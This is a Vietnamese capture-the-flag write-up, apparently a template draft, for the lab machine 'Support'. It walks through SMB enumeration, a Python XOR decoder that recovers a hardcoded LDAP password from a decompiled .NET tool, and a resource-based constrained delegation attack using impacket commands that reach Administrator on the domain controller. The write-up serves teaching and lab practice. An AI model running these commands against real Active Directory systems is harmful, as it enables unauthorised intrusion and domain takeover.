---
title: Support
date: 2025-10-02
difficulty: Easy
os: Windows
summary: Một file .NET trên share công khai lộ mật khẩu LDAP, thuộc tính info lộ tiếp mật khẩu của support, và quyền GenericAll lên DC mở đường cho RBCD.
tags: [SMB, LDAP, .NET, RBCD]
attack_path:
  - node: Anonymous
    type: user
    edge: Dịch ngược UserInfo.exe trên share
  - node: ldap
    type: user
    edge: Mật khẩu nằm trong thuộc tính info
  - node: support
    type: user
    edge: MemberOf
  - node: Shared Support Accounts
    type: group
    edge: GenericAll
  - node: DC.SUPPORT.HTB
    type: computer
    edge: RBCD rồi S4U
  - node: SUPPORT.HTB
    type: domain
---

> Đây là bài mẫu để bạn xem giao diện. Nó nằm trong `_drafts` nên sẽ **không** được đăng. Thay bằng nội dung của bạn rồi chuyển sang `_posts`.

## Recon

Quét toàn bộ port, máy trả về đúng bộ dịch vụ của một Domain Controller: DNS, Kerberos, LDAP, SMB.

```bash
nmap -sCV -p- --min-rate 5000 10.10.11.174
```

```text
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.174
Host is up (0.051s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-02 08:14:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-02T08:15:12
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.42 seconds
```

Output trên chỉ là ví dụ minh hoạ cho khối thu gọn, không phải kết quả thật của bạn.

## SMB: share support-tools

Guest được liệt kê share, và có một share không mặc định.

```bash
nxc smb 10.10.11.174 -u guest -p '' --shares
```

Trong `support-tools` có `UserInfo.exe.zip`. Đây là một binary .NET, nên dịch ngược bằng ILSpy hoặc dnSpy là đọc được gần như nguyên mã nguồn.

<div class="note" markdown="1">
**Vì sao đáng để ý?** Công cụ nội bộ do IT tự viết thường hard-code tài khoản dịch vụ để truy vấn LDAP. Gặp file `.exe` lạ trên share là nên mở ra xem.
</div>

Hàm `getPassword()` XOR chuỗi base64 với key `armando` rồi với `0xDF`. Viết lại bằng Python là ra mật khẩu của tài khoản `ldap`.

```python
import base64
enc = base64.b64decode("<chuỗi enc_password>")
key = b"armando"
print(bytes(b ^ key[i % len(key)] ^ 0xDF for i, b in enumerate(enc)).decode())
```

## LDAP: thuộc tính info

Có tài khoản `ldap`, dump toàn bộ người dùng. Tài khoản `support` có một giá trị lạ trong thuộc tính `info`, và đó chính là mật khẩu.

```bash
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w '<mật khẩu ldap>' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)' info memberOf
```

`support` thuộc nhóm `Remote Management Users`, nên vào được bằng WinRM và lấy `user.txt`.

## BloodHound: GenericAll lên DC

Chạy BloodHound từ tài khoản `support`. Nhóm `Shared Support Accounts` có **GenericAll** trên object máy `DC`. Quyền này cho phép ghi `msDS-AllowedToActOnBehalfOfOtherIdentity`, tức là cấu hình Resource-Based Constrained Delegation.

## Root: RBCD

Mặc định mỗi user được tạo tối đa 10 tài khoản máy (`ms-DS-MachineAccountQuota`), nên tạo một máy giả rồi cho nó quyền delegate tới DC.

```bash
impacket-addcomputer support.htb/support:'<mật khẩu>' -computer-name 'FAKE01$' -computer-pass 'Passw0rd!'
impacket-rbcd support.htb/support:'<mật khẩu>' -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write
impacket-getST support.htb/'FAKE01$':'Passw0rd!' -spn cifs/dc.support.htb -impersonate Administrator
```

Dùng ticket vừa xin để vào DC dưới quyền Administrator.

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass dc.support.htb
```

## Bài học

- Đừng bỏ qua file trên share chỉ vì nó là `.exe`.
- Các thuộc tính mô tả như `info` hay `description` hay bị dùng để "ghi chú" mật khẩu.
- GenericAll trên một object máy gần như luôn đồng nghĩa với RBCD.
